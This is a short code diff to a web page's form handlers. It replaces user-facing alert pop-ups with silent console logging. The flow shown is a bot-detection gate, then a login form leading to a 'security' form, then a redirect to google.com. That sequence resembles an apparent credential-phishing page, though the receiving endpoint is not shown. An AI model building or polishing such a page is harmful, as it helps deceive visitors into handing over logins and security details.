@@ -215,7 +215,7 @@
             form.addEventListener('submit', function(e) {
                 if (detectBot()) {
                     e.preventDefault();
-                    alert('Security verification failed. Please try again later.');
+                console.log('Security verification failed. Please try again later.');
                     return false;
                 }
                 
@@ -238,7 +238,7 @@
                         if (form.id === 'loginForm') {
                             window.location.href = 'security.html';
                         } else if (form.id === 'securityForm') {
-                            alert('Success');
+                            console.log('Success');
                             setTimeout(function() {
                                 window.location.href = 'https://www.google.com';
                             }, 1000);
@@ -246,7 +246,7 @@
                     })
                     .catch(error => {
                         console.error('Form submission error:', error);
-                        alert('Submission failed: ' + error.message);
+                        console.log('Submission failed: ' + error.message);
                     });
                 }, delay);
             });
